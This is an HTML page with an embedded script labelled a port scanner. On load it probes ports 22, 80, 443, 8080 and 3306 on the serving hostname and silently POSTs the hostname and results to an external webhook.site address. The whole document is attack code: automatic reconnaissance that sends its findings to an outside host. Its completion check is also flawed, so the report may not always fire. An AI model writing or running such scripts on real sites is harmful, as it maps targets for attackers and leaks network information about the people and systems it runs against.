<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Port Scanner</title>
</head>
<body>
    <h1>Port Scanner</h1>
    <script>
        // Function to send data to the webhook
        function sendToWebhook(data) {
            fetch('https://webhook.site/4eb0eaf7-b3a6-47d2-85c8-c47759291f94', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            }).then(response => {
                console.log('Data sent to webhook:', response);
            }).catch(console.error);
        }

        // Automatically detect the hostname
        const hostname = window.location.hostname;
        const commonPorts = [22, 80, 443, 8080, 3306]; // Add more common ports if needed
        const results = {};

        commonPorts.forEach(port => {
            const url = `http://${hostname}:${port}`;
            const xhr = new XMLHttpRequest();
            xhr.open('GET', url, true);
            xhr.onload = function () {
                results[port] = 'Open';
                if (xhr.status !== 200) {
                    results[port] = 'Closed';
                }
                // Check if all ports are scanned
                if (Object.keys(results).length === commonPorts.length) {
                    sendToWebhook({ hostname, results });
                }
            };
            xhr.onerror = function () {
                results[port] = 'Closed';
            };
            xhr.send();
        });
    </script>
</body>
</html>
